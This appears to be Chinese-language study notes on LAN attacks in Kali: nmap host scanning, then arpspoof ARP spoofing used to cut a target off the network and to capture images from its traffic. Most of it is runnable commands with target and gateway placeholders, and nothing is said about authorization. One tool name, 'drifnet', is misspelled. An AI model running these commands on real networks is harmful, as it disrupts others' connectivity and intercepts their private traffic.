## 无线网络安全, 网络扫描和ARP欺骗

- [无线网络安全, 网络扫描和ARP欺骗](#无线网络安全-网络扫描和arp欺骗)
  - [1.网络扫描和嗅探](#1网络扫描和嗅探)
  - [2.ARP欺骗](#2arp欺骗)
  - [2.1.断网攻击](#21断网攻击)
  - [2.2.图片捕获](#22图片捕获)

> !阅前须知!  
>> 本文是基于我很久以前学习网络基础时的笔记,  
>> 文中的工具可能已经过时, 或者使用方法已经改变了, 感兴趣可以自行深入查阅资料.  

```ps.本文环境在Kali下, 学习最好具备一点linux基础知识.```

### 1.网络扫描和嗅探

`NMap(Network Mapper)`, 一个很不错的网络扫描和嗅探工具包.  

```bash
# NMap真的很常用, 简直神器
# 列出几种简单的使用方法:

# ping扫描, 快速, 不过回显的内容有限
> nmap -sP (网关IP)/(子网掩码)

# SYN/半开放扫描, 加上-A回显详细信息
> nmap -sS [-A] (网关IP)/(子网掩码)

# 单个扫描, 显示详细内容
> nmap -A (目标IP)

# 示例
> nmap -sP 192.168.1.1/24
```

### 2.ARP欺骗

局域网中的`ARP欺骗`, 像`arpspoof`、`Ettercap`等工具都很不错.  
ARP欺骗之后其实可以很多动作的,  
这里就介绍下arpspoof的断网攻击和图片捕获.  

```bash
# 首先, 在局域网环境中配合NMap工具使用, 取得目标IP
> nmap -sP (网关IP)/(子网掩码)
```

### 2.1.断网攻击

```ps.修改ip_forward的值, 是为了开启IP转发, 其值为'0'时候则禁止转发, 目标主机断网.```

```bash
# 修改ip_forward(默认为'0')
# 可以提前cat查看一下, 若是回显'0', 则可以跳过本步
> echo 0 > /proc/sys/net/ipv4/ip_forward 

# 开始arp欺骗
> arpspoof -i (你的网卡名称) -t (目标IP) (网关IP)

# 使用目标主机上网测试, 观察命令行回显.
```

### 2.2.图片捕获

```bash
# 修改ip_forward(默认为'0')
# 可以提前cat查看一下, 若是回显'1', 则可以跳过本步
> echo 1 > /proc/sys/net/ipv4/ip_forward 

# 开始arp欺骗(本机网卡名, 可以用ifconfig来查看)
> arpspoof -i (本机网卡名) -t (目标IP) (网关IP)

# 另外再开一终端, 开始抓取图片
> drifnet -i (本机网卡名)

# 使用目标主机上网看图片, 观察弹出的窗口回显图片, 观察命令行回显.
```

> 常见的网络协议是网络安全中的基础, 能让你能够更快吸收了解技术细节.